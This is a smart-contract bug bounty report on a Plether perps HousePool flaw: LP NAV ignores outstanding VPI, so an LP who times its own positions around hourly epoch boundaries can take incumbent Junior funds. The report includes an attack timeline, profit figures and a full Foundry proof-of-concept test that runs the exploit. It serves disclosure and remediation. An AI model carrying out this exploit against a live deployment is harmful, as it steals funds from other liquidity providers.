# \#97690 [SC-Critical] VPI excluded from LP NAV but always reversed by the lifetime clamp lets an LP time its own position around epoch boundaries to take incumbent Junior funds

**Submitted on Nov 2nd 2026 at 17:46:47 UTC by @Naresh_Kandula for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97690
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
Outstanding VPI (price-impact charges and rebates) moves real cash in and out of HousePool when a position opens, and the lifetime clamp guarantees it reverses exactly at close, but LP NAV ignores that outstanding VPI. An unprivileged trader who is also a Junior LP can open its own skew-changing position seconds before an hourly LP epoch boundary, have its Junior redemption (or deposit) priced at the mispriced NAV, then close and get the VPI reversed, paying only execution fees. No organic order flow is required. At release parameters this takes about 0.4% of incumbent Junior principal per 3-hour cycle (+26.5k USDG per cycle at a 40M/10M pool), and a persistent-position variant drains about 12.5% of passive incumbent Junior per day. Senior is not affected.

## Vulnerability Details
VPI moves real cash in and out of HousePool when a position opens:
- A **skew-increasing** open pays a VPI charge `C` into the pool. It is booked as revenue, so NAV rises by `C`.
- A **skew-reducing** open receives a rebate `R` from the pool, so NAV falls by `R`.

The lifetime clamp guarantees that both reverse exactly when the position closes (CloseAccountingLib.sol:103-118). A position's lifetime VPI can never end below zero, and the close VPI of a full round trip refunds an earlier charge, or claws back an earlier rebate, to exactly zero. A non-withdrawable reserve backs the rebate clawback.

LP NAV, however, counts only pool cash, the terminal price delta and trader claims (HousePoolAccountingLib.sol:57-76). It ignores the outstanding VPI that is certain to reverse. While a position is open, NAV is therefore overstated by `C` or understated by `R`, and LP shares are priced from that NAV at a permissionless hourly epoch boundary.

An attacker who is also a Junior LP:
- **Scenario A (main; no organic flow needed):** opens a large skew-increasing position about 70 s before the boundary at which its own matured redemption settles. The redemption is priced at NAV + C. It then closes the position and gets `C` refunded. The trader leg's lifetime VPI is exactly 0, so it pays only the two 4 bp execution fees.
- **Scenario B (entry side, when organic skew exists):** opens a skew-reducing position just before its own Junior deposit activates. The deposit is priced at NAV − R. It then closes, and the clamp returns `R` to the pool.

The two scenarios stack. The attacker's gain equals the incumbent Junior loss, one for one, and Senior is unaffected.

This breaks properties the protocol documents:
- SECURITY.md:1443 (Known Limitations, VPI): *"the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"*. These cycles are round trips with zero lifetime VPI, and they are still extracted, through LP pricing.
- SECURITY.md:859-860: *"new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV"*.

### Root cause
1. **Positive charge enters NAV as revenue.** `applyOpenCost` debits `tradeCostAssets = vpiAssets + executionFeeAssets` (OpenAccountingLib.sol:127-135). The non-fee portion is booked through `recordClaimantInflow(..., ClaimantInflowKind.Revenue, CashArrived)` (CfdEngineSettlementSidecar.sol:446-463), which raises `accountedAssets`.
2. **Rebates leave NAV.** A negative trade cost becomes `poolRebatePayoutAssets` (CfdEnginePlanLib.sol:333), paid through `HousePool.payOut` (CfdEngineSettlementSidecar.sol:442-443; HousePool.sol:604-613).
3. **The guaranteed reversal is never booked.** Reconcile NAV is `physicalAssets ± terminalPriceDelta − traderClaims`, with no VPI term (HousePoolAccountingLib.sol:57-76). The terminal book caps collectible value at pledge + claim (TerminalNavBookV2.sol:433-434). A reserve exists only for negative VPI (CfdEnginePlanLib.sol:48-55), and even that reserve is not an LP asset.
4. **LP shares are priced from that NAV.** `settleLpEpoch` (HousePool.sol:797-821), reachable through the permissionless Router path, reconciles and then prices Junior activations and redemptions from `juniorPrincipal` (HousePool.sol:824, :839, :915).
5. **The reversal is exact.** For a full close, the proportional accrual is the entire lifetime VPI, and the clamp sets close VPI to `−accrual` (CloseAccountingLib.sol:116-117). The positive-side refund is paid from free pool cash (CfdEnginePlanLib.sol:970-977). The negative-side clawback is consumed from the reserve (CfdEnginePlanLib.sol:1052-1057; CfdEngineSettlementSidecar.sol:691-692).

### Why the documented VPI exclusion does not cover this
SECURITY.md:871-872 and ACCOUNTING_SPEC.md:1064-1066 (*"anticipated carry, VPI, fees, spreads… stay outside terminal K … The VPI reserve therefore does not inflate marked LP receivables or symmetric LP NAV"*) describe the mechanism. They do not accept a transfer between LPs, and the reason given for the exclusion is to avoid *phantom* or *anticipated* receivables (SECURITY.md:861). Here the reversal is not anticipated, for two reasons:
- **The attacker controls it.** The attacker's own close follows seconds later.
- **The clamp makes it exact.** For rebates, a locked reserve also backs it.

The team spells out its acceptance of LP-cohort timing transfers in one place only, for **carry** (ACCOUNTING_SPEC.md:737-740: *"This intentionally allows a trader and incoming LP to time collection after LP activation … collection-time ownership policy"*). There is no equivalent for VPI, and the VPI Known Limitation says the opposite (SECURITY.md:1443).

SECURITY.md:1049 (*"trading … can change NAV"*) refers to real economic changes. Here NAV is mispriced by an amount the attacker both creates and reverses.

### Attack (Scenario A: one cycle, public paths only)
The attacker is unprivileged and orders are executed by an independent keeper. There is no organic skew.

| Time | Action |
|---|---|
| T0 (flat book) | `requestDeposit` into Junior, activated at fair NAV. After the 1 h cooldown, `requestRedeem` for epoch T. |
| T−70 s | `OrderRouter.commitOrder` for a skew-increasing position X of up to 40% of depth, executed by a keeper. The pool books charge `C = k·X²/(2D)` as revenue. |
| T | The attacker (acting as keeper) calls `router.settleLpEpoch`. The redemption is funded at NAV + C. |
| T + seconds | Full close. The clamp refunds exactly `C` from the pool. |

Edge per cycle ≈ `f·C − 8bp·X`, where `f` is the attacker's share of Junior at exit. The edge is convex in X, so the optimum is at the 40% skew cap, where `C ≈ 0.0008·D`. It is positive whenever `f > ~0.41`.

Junior has no cap and deposits can be cancelled until their epoch (TrancheVault.sol:852-859). The capital needed is about 4× incumbent Junior for f = 0.8. The edge is still positive at f = 0.5.

## Impact Details
Selected impact: **High: theft of unclaimed yield.** Incumbent Junior LPs are owed the pool's VPI round trip, which the clamp guarantees will net to zero. An unprivileged LP captures it at every epoch through entry and exit pricing. In every PoC run, the attacker's gain equals the incumbent Junior loss one-for-one, and Senior is unchanged.

- Scenario A (no organic skew), small pool: edge **+2,644.71 USDG** per cycle; incumbent Junior loses 4,044.91.
- Release scale (Senior 40M / Junior 10M): **+26,469.54 per cycle**; 11 cycles (~33 h) net **+294,994.96**, and incumbent Junior falls 9,974,697.75 → 9,520,100.73 (**−4.56%**).
- Scenario B (entry side, organic skew): +1,797.00 per cycle.
- Escalation (persistent position): incumbent Junior **−12.50% per day**, −32.9% over 3 weekdays. The result is scale-invariant and hedgeable. About 73% of this variant's edge comes from depth (disclosed); the rest persists at constant depth.
- Capital: roughly 4× incumbent Junior for an attacker share f = 0.8. The edge stays positive for f > ~0.41, and Junior is uncapped. An alert incumbent loses about one cycle before it can exit; passive incumbents keep losing.

### Why this is not a known issue
- **No matching finding in any listed source.** I checked all three audits, the AI scan, SECURITY.md Known Limitations and the program's known-issue list. The nearest entries:
  - AI-scan :1334 (nominal rebate credit with fee-on-transfer tokens) has a different root cause.
  - S4/S30/S31 manipulate the VPI *amount* through depth, which is the "sandwich" CloseAccountingLib.sol:112 refers to. Here the amount is untouched and the clamp makes the refund exactly `C`.
  - SC-H1 (deposit before yield) was removed in the redesign.
- **HIGH-1** covers Pyth clock alignment. This attack is deterministic at a flat price, and it meets HIGH-1's own bar of repeatable, net-profitable extraction from LPs.
- **MED-24/MED-29** cover refund-epoch liveness and dust rounding.
- There is no issue or PR in either public repository.

### Recommendation
Book outstanding signed VPI in the LP snapshot at its guaranteed reversal value:
- subtract `Σ max(vpiAccrued, 0)` over open positions as a liability (refunds the clamp allows);
- add the reserve-backed `Σ max(−vpiAccrued, 0)` as an asset;

in `HousePoolAccountingLib.buildReconcileSnapshot`.

Alternatively, defer LP activations and redemptions while any position opened within the current epoch is still open, or price them net of outstanding VPI.

## References
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol (buildReconcileSnapshot, L57-76)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol (L442-443, L446-463, L691-692)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol (L103-118)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol (L48-55, L333, L970-977, L1052-1057)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol (L604-613, L797-821, L824, L839, L915)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol (L433-434)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md (L859-872, L1443)
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md (L737-740, L1064-1066)


## Appendix: `test/perps/Hunt_N2Final.t.sol` (Scenario B, entry side; 8/8 pass)
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// N2 FINAL (pin a82d4fef) — negative-VPI open rebate is paid from pool cash and EXCLUDED from LP NAV, but the lifetime
// clamp always claws it back at close. An actor who holds a Junior deposit request AND opens a skew-reducing position
// just before the LP epoch boundary gets its deposit priced at a NAV that is understated by exactly the rebate R; the
// clawback at close then returns R to a Junior supply that now includes the attacker's freshly minted shares.
//
//   (1) requestDeposit (Junior) at T-10min (request cutoff is T-5min) -> activates at epoch boundary T
//   (2) T-70s: commitOrder(LONG, skew-reducing) ; T-69s: third-party keeper executeOrder   -> rebate R paid, NAV -R
//   (3) T: attacker calls router.settleLpEpoch (permissionless keeper path) -> deposit priced at NAV - R
//   (4) T+1s: commitOrder(close) ; keeper executeOrder -> lifetime clamp claws back exactly R, NAV +R (shared)
//   (5) T+1h+1s (cooldown) requestRedeem ; T+2h settleLpEpoch ; claimRedeem
//
// Everything runs through public entrypoints: production OrderRouter.commitOrder(OrderV3Types.OrderRequest) (no test
// adapter), router.executeOrder / settleLpEpoch / updateMarkPrice, TrancheVault requestDeposit / claimDepositShares /
// requestRedeem / claimRedeem. Real HousePool, TrancheVault (both), MarginClearinghouse, CfdEngine, PletherOracle.
// Mocks: MockPyth (Pyth updates) and MockSettlementToken (USDG) only, both out of scope. No vm.store/etch/mockCall.
// Owner action: setUp applies DEPLOYMENT.md release router/oracle params through the normal 72h timelock (documented
// normal deployment configuration). Risk params = DEPLOYMENT.md "Initial release parameters".

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "./BasePerpTest.sol";

contract Hunt_N2FinalTest is BasePerpTest {

    address internal constant COUNTER = address(0x2C0); // organic short-heavy flow (other traders)
    address internal constant ORGANIC_LONG = address(0x2C1); // organic skew-reducing trader (passive scenario)
    address internal constant ATK_TR = address(0x2A71); // attacker trader account
    address internal constant ATK_LP = address(0x2A72); // attacker LP account (same entity)
    address internal constant KEEPER = address(0x2A73); // independent third-party keeper (executes orders)

    uint256 internal constant P0 = 1e8; // basket price 1.00 (8 decimals)
    uint256 internal constant BP = 10_000; // 1 bp of P0
    uint256 internal constant SKEW = 2_000_000e18; // organic short: 2M notional = 40% of ~5M depth (release cap)

    uint64 internal confRaw; // per-feed Pyth confidence (0 = mock default)

    struct Outcome {
        uint256 lpAssetsOut;
        int256 traderDelta;
        int256 attackerNet;
        uint256 incumbentJunior;
        uint256 incumbentSenior;
        int256 rebate;
        uint256 navBeforeOpen;
        uint256 navAtSettle;
        uint256 navAfterClose;
        uint256 shares;
    }

    struct Cmp {
        int256 edge; // attacker net (attack) - attacker net (control)
        int256 lpLegGain; // LP assets out (attack) - LP assets out (control)
        int256 incumbentLoss; // incumbent Junior value (control) - (attack)
        int256 seniorDiff; // incumbent Senior value (attack) - (control)
        int256 rebate;
        int256 traderDelta;
        int256 attackNet;
        int256 controlNet;
        uint256 confSpread; // 2 fills x (conf x 2500 bps) x size, in USDG atoms
    }

    // ------------------------------------------------------------------ release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DEPLOYMENT.md "Initial release parameters"
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 4_000_000e6; // 80% of pool = release maxSeniorShareBps
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        assertEq(engine.executionFeeBps(), 4, "release exec fee 4 bps");

        // Owner, normal deployment configuration through the 72h timelock: DEPLOYMENT.md oracle/router release values.
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.basketMaxConfidenceRatioBps = 10;
        cfg.adverseConfidenceMultiplierBps = 2500;
        cfg.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(cfg);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500);

        vm.deal(KEEPER, 10 ether);
        vm.deal(ATK_TR, 10 ether);
        _fundTrader(COUNTER, 200_000e6);
        _fundTrader(ORGANIC_LONG, 200_000e6);
        _fundTrader(ATK_TR, 200_000e6);
        _refresh(P0);
        _trade(COUNTER, CfdTypes.Side.SHORT, SKEW, 100_000e6, false, P0);
    }

    // ------------------------------------------------------------------ public-path helpers

    function _pythData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes32[] memory ids = _basePythFeedIds();
        uint256 previous = engine.lastMarkTime();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), confRaw, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _refresh(
        uint256 price
    ) internal {
        bytes[] memory d = _pythData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    /// Production V3 commit (the bounded-order surface a real frontend uses). Market order: no price limit.
    function _commit(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 id) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(trader, block.timestamp, size, isClose)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        id = OrderRouter(payable(address(router))).commitOrder(req);
    }

    function _execute(
        uint64 id,
        uint256 price
    ) internal {
        bytes[] memory data = _pythData(price);
        vm.prank(KEEPER); // independent keeper; any open-order bounty it earns is a cost to the attacker
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _execute(_commit(trader, side, size, margin, isClose), price);
    }

    /// Permissionless epoch settlement via the Router keeper path, called by `caller` (any address).
    function _settleEpoch(
        address caller,
        uint256 price
    ) internal {
        bytes[] memory d = _pythData(price);
        vm.prank(caller);
        router.settleLpEpoch(d);
    }

    function _vpi(
        address a
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _size(
        address a
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _lpNav() internal view returns (uint256) {
        return juniorVault.totalAssets() + seniorVault.totalAssets();
    }

    /// Next epoch boundary T that still accepts requests at T-10min (request cutoff is T-5min).
    function _nextTarget() internal view returns (uint256 T) {
        T = ((block.timestamp + 15 minutes) / 1 hours + 1) * 1 hours;
    }

    // ------------------------------------------------------------------ one cycle

    /// size == 0 is the CONTROL: identical LP deposit / redeem timing and prices, no trader leg.
    /// holdPrice is the basket price from T+30min through the redeem settlement (LP-leg market exposure).
    function _cycle(
        uint256 depositAssets,
        uint256 size,
        uint256 holdPrice
    ) internal returns (Outcome memory o) {
        uint256 traderBefore = clearinghouse.balanceAssets(ATK_TR);
        uint256 T = _nextTarget();

        // (1) T-10min: request a Junior deposit; it is assigned to the epoch that activates at T
        vm.warp(T - 10 minutes);
        _refresh(P0);
        settlementToken.mint(ATK_LP, depositAssets);
        vm.startPrank(ATK_LP);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depId = juniorVault.requestDeposit(depositAssets, ATK_LP, ATK_LP);
        vm.stopPrank();
        assertEq(juniorVault.depositEpochStart(depId), T, "deposit activates at targeted boundary");

        // (2) T-70s commit / T-69s keeper executes a skew-reducing LONG -> negative VPI rebate paid from pool cash
        vm.warp(T - 70);
        _refresh(P0);
        o.navBeforeOpen = _lpNav();
        if (size != 0) {
            uint64 openId = _commit(ATK_TR, CfdTypes.Side.LONG, size, 20_000e6, false);
            _execute(openId, P0);
            o.rebate = _vpi(ATK_TR);
            assertLt(o.rebate, 0, "open received a VPI rebate");
            assertLt(block.timestamp, T, "open executed before the boundary");
        }

        // (3) T: attacker itself settles the epoch through the permissionless Router path
        vm.warp(T - 1); // _pythData advances 1 s -> settlement at exactly T
        _settleEpoch(ATK_TR, P0);
        assertEq(block.timestamp, T);
        o.navAtSettle = _lpNav();

        // (4) close right after settlement (flat price) -> lifetime clamp claws back the full rebate
        if (size != 0) {
            uint64 closeId = _commit(ATK_TR, CfdTypes.Side.LONG, size, 0, true);
            _execute(closeId, P0);
            assertEq(_size(ATK_TR), 0, "attacker trader leg flat");
        } else {
            _refresh(P0);
        }
        o.navAfterClose = _lpNav();

        vm.prank(ATK_LP);
        o.shares = juniorVault.claimDepositShares(depId);

        // LP hold: optional basket move at T+30min, kept through the redeem settlement
        vm.warp(T + 30 minutes);
        _refresh(holdPrice);

        // (5) after the 1h cooldown: request redeem, settle next epoch, claim
        vm.warp(T + 1 hours + 1);
        _refresh(holdPrice);
        vm.prank(ATK_LP);
        uint256 redId = juniorVault.requestRedeem(o.shares, ATK_LP, ATK_LP);
        vm.warp(pool.lpEpochStart(redId) - 1);
        _settleEpoch(ATK_TR, holdPrice);
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, ATK_LP);
        assertEq(claimable, o.shares, "redeem fully funded");
        vm.prank(ATK_LP);
        o.lpAssetsOut = juniorVault.claimRedeem(redId, claimable, ATK_LP, ATK_LP);

        o.traderDelta = int256(clearinghouse.balanceAssets(ATK_TR)) - int256(traderBefore);
        o.attackerNet = int256(o.lpAssetsOut) - int256(depositAssets) + o.traderDelta;
        o.incumbentJunior = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        o.incumbentSenior = seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _log(
        string memory tag,
        Outcome memory o
    ) internal pure {
        console2.log(tag);
        console2.log("  rebate (vpiAccrued after open)");
        console2.logInt(o.rebate);
        console2.log("  LP NAV before open / at settle / after close", o.navBeforeOpen, o.navAtSettle, o.navAfterClose);
        console2.log("  shares minted / LP assets out", o.shares, o.lpAssetsOut);
        console2.log("  trader clearinghouse delta (fees, bounty, carry)");
        console2.logInt(o.traderDelta);
        console2.log("  ATTACKER NET (LP out - deposit + trader delta)");
        console2.logInt(o.attackerNet);
        console2.log("  incumbent junior / senior value", o.incumbentJunior, o.incumbentSenior);
    }

    /// Runs CONTROL then ATTACK from the same snapshot. State is left AFTER the attack (so cycles can chain).
    function _attackVsControl(
        string memory tag,
        uint256 depositAssets,
        uint256 size,
        uint256 holdPrice
    ) internal returns (Cmp memory r) {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _cycle(depositAssets, 0, holdPrice);
        vm.revertToState(snap);
        Outcome memory a = _cycle(depositAssets, size, holdPrice);
        console2.log("==========", tag);
        _log("CONTROL (same snapshot, no trader leg)", c);
        _log("ATTACK", a);
        r.edge = a.attackerNet - c.attackerNet;
        r.lpLegGain = int256(a.lpAssetsOut) - int256(c.lpAssetsOut);
        r.incumbentLoss = int256(c.incumbentJunior) - int256(a.incumbentJunior);
        r.seniorDiff = int256(a.incumbentSenior) - int256(c.incumbentSenior);
        r.rebate = a.rebate;
        r.traderDelta = a.traderDelta;
        r.attackNet = a.attackerNet;
        r.controlNet = c.attackerNet;
        uint256 shift = uint256(confRaw) * router.pletherOracle().adverseConfidenceMultiplierBps() / 10_000;
        r.confSpread = 2 * size * shift / 1e8 / 1e12;
        console2.log("EDGE (attack net - control net)");
        console2.logInt(r.edge);
        console2.log("attacker LP-leg gain vs control");
        console2.logInt(r.lpLegGain);
        console2.log("incumbent Junior loss vs control");
        console2.logInt(r.incumbentLoss);
        console2.log("incumbent Senior diff vs control");
        console2.logInt(r.seniorDiff);
    }

    function _assertTransfer(
        Cmp memory r
    ) internal pure {
        assertGt(r.edge, 0, "attack net-profitable after all costs");
        assertGt(r.incumbentLoss, 0, "incumbent Junior pays");
        // The LP-leg gain is taken 1:1 from incumbent Junior, plus the attacker's own adverse-confidence spread that the
        // trader leg paid INTO the pool (2 fills x shift x size; 0 when conf = 0). Tolerance: 0.1% of the rebate.
        assertApproxEqAbs(
            r.lpLegGain - r.incumbentLoss, int256(r.confSpread), uint256(-r.rebate) / 1000, "LP gain == incumbent loss"
        );
        // edge == LP-leg gain + trader-leg cost (the trader leg's only cost is fees/bounty/carry; lifetime VPI is 0)
        assertEq(r.edge, r.lpLegGain + r.traderDelta, "edge decomposition");
        // Senior is untouched (fixed-coupon tranche)
        assertApproxEqAbs(r.seniorDiff, 0, 2e6, "Senior unaffected");
    }

    // ------------------------------------------------------------------ tests

    /// 1. CONTROL: same snapshot, no trader leg -> LP round trip nets <= 0; incumbent unchanged except normal flows.
    function test_control() public {
        uint256 incBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        Outcome memory c = _cycle(4_000_000e6, 0, P0);
        _log("CONTROL", c);
        assertEq(c.traderDelta, 0, "no trader leg");
        assertLe(c.attackerNet, 0, "plain LP round trip is not profitable");
        assertApproxEqRel(c.lpAssetsOut, 4_000_000e6, 0.0001e18, "round trip ~flat (carry/coupon only)");
        // incumbent Junior only moves by ordinary carry/coupon flows (< 1 bp of its value over ~2h)
        assertApproxEqRel(c.incumbentJunior, incBefore, 0.0001e18, "incumbent unchanged except normal flows");
        console2.log("incumbent junior before / after", incBefore, c.incumbentJunior);
    }

    /// 2. Full public-path single cycle, f ~ 0.8 (deposit 4M vs 1M incumbent Junior), long 1.5M vs 2M organic short.
    function test_attack_singleCycle() public {
        Cmp memory r = _attackVsControl("SINGLE CYCLE conf=0", 4_000_000e6, 1_500_000e18, P0);
        _assertTransfer(r);
    }

    /// 3. Realistic Pyth confidence: 2 bps per feed -> basket conf 2 bps, adverse shift 0.5 bp per fill (x2500 bps).
    function test_attack_withReleaseConfidence() public {
        confRaw = uint64(2 * BP); // 2 bps of P0
        Cmp memory r = _attackVsControl("SINGLE CYCLE conf=2bps", 4_000_000e6, 1_500_000e18, P0);
        _assertTransfer(r);
    }

    /// 4. 5 bps basket move during the LP hold, both directions. Organic flow is net SHORT, and SHORT profits when the
    ///    basket RISES (CfdTypes.Side), so a RISE is adverse for the pool and for the attacker's Junior position. The
    ///    edge vs control keeps its sign and the attacker's absolute P&L is linear in the move => zero-mean (hedgeable)
    ///    noise around the flat result. Runs with 2 bps confidence.
    function test_attack_adverseMoveDuringHold() public {
        confRaw = uint64(2 * BP);
        uint256 snap = vm.snapshotState();
        Cmp memory flat = _attackVsControl("HOLD flat", 4_000_000e6, 1_500_000e18, P0);
        vm.revertToState(snap);
        Cmp memory adverse = _attackVsControl("HOLD +5bps (adverse)", 4_000_000e6, 1_500_000e18, P0 + 5 * BP);
        vm.revertToState(snap);
        Cmp memory fav = _attackVsControl("HOLD -5bps (favourable)", 4_000_000e6, 1_500_000e18, P0 - 5 * BP);

        assertGt(adverse.edge, 0, "edge survives adverse move");
        assertGt(fav.edge, 0, "edge survives favourable move");
        assertLt(adverse.attackNet, flat.attackNet, "adverse move costs the LP leg");
        assertGt(adverse.attackNet, 0, "attack still net positive in absolute terms after a 5 bp adverse move");
        // EV: mean of the +/- move equals the flat outcome within 2% of the flat net
        int256 mean = (adverse.attackNet + fav.attackNet) / 2;
        assertApproxEqAbs(mean, flat.attackNet, uint256(flat.attackNet) / 50, "price exposure is zero-mean");
        console2.log("abs attacker net flat / +5bp adverse / -5bp favourable");
        console2.logInt(flat.attackNet);
        console2.logInt(adverse.attackNet);
        console2.logInt(fav.attackNet);
        console2.log("control (honest LP) abs net flat / adverse / favourable");
        console2.logInt(flat.controlNet);
        console2.logInt(adverse.controlNet);
        console2.logInt(fav.controlNet);
    }

    /// 5. Three consecutive cycles, each with its own same-snapshot control.
    function test_attack_repeated() public {
        uint256 incStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        int256 total;
        for (uint256 i; i < 3; ++i) {
            Cmp memory r = _attackVsControl(i == 0 ? "CYCLE 1" : (i == 1 ? "CYCLE 2" : "CYCLE 3"), 4_000_000e6, 1_500_000e18, P0);
            _assertTransfer(r);
            total += r.edge;
        }
        uint256 incEnd = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        console2.log("total edge over 3 cycles");
        console2.logInt(total);
        console2.log("incumbent junior start / end", incStart, incEnd);
        assertLt(incEnd, incStart, "incumbent Junior bled over 3 cycles");
    }

    /// 6. Passive form: an honest incumbent redeeming while an ORGANIC skew-reducing position (with an outstanding
    ///    rebate) is open is paid at NAV - R; the clawback later accrues to the remaining holders.
    function test_passive_incumbentShortChanged() public {
        uint256 T = _nextTarget();
        uint256 redeemShares = juniorVault.balanceOf(address(this)) / 2;
        uint256 supply = juniorVault.totalSupply();

        uint256 snap = vm.snapshotState();
        (uint256 outControl,) = _passive(T, redeemShares, false);
        vm.revertToState(snap);
        (uint256 outAttack, int256 rebate) = _passive(T, redeemShares, true);

        uint256 shortfall = outControl - outAttack;
        uint256 expected = uint256(-rebate) * redeemShares / supply;
        console2.log("PASSIVE redeem 50% of incumbent junior shares: assets out control / with organic rebate", outControl, outAttack);
        console2.log("  organic rebate outstanding at settlement");
        console2.logInt(rebate);
        console2.log("  shortfall / pro-rata expected", shortfall, expected);
        assertGt(shortfall, 0, "redeemer short-changed");
        assertApproxEqRel(shortfall, expected, 0.02e18, "shortfall = pro-rata share of the excluded receivable");
    }

    function _passive(
        uint256 T,
        uint256 shares,
        bool organicOpen
    ) internal returns (uint256 out, int256 rebate) {
        vm.warp(T - 10 minutes);
        _refresh(P0);
        uint256 redId = juniorVault.requestRedeem(shares, address(this), address(this));
        assertEq(pool.lpEpochStart(redId), T);
        vm.warp(T - 70);
        _refresh(P0);
        if (organicOpen) {
            _trade(ORGANIC_LONG, CfdTypes.Side.LONG, 1_500_000e18, 20_000e6, false, P0);
            rebate = _vpi(ORGANIC_LONG);
        }
        vm.warp(T - 1);
        _settleEpoch(KEEPER, P0);
        out = juniorVault.claimRedeem(redId, juniorVault.claimableRedeemRequest(redId, address(this)), address(this), address(this));
        if (organicOpen) {
            // organic trader closes 30 min later; clawback returns R to the holders that remained
            vm.warp(T + 30 minutes);
            _trade(ORGANIC_LONG, CfdTypes.Side.LONG, 1_500_000e18, 0, true, P0);
        }
    }

    // ------------------------------------------------------------------ sensitivity (edge table)

    function test_sensitivity_f50() public {
        Cmp memory r = _attackVsControl("f~0.5: deposit 1M, long 1.2M", 1_000_000e6, 1_200_000e18, P0);
        _assertTransfer(r);
    }

    function test_sensitivity_skew20pct_conf2bps() public {
        confRaw = uint64(2 * BP);
        _trade(COUNTER, CfdTypes.Side.SHORT, 1_000_000e18, 0, true, P0); // organic short now 1M = 20% of depth
        Cmp memory r = _attackVsControl("skew 20%, conf 2bps: deposit 4M, long 500k", 4_000_000e6, 500_000e18, P0);
        _assertTransfer(r);
    }

}

```


## Proof of Concept

## Proof of Concept
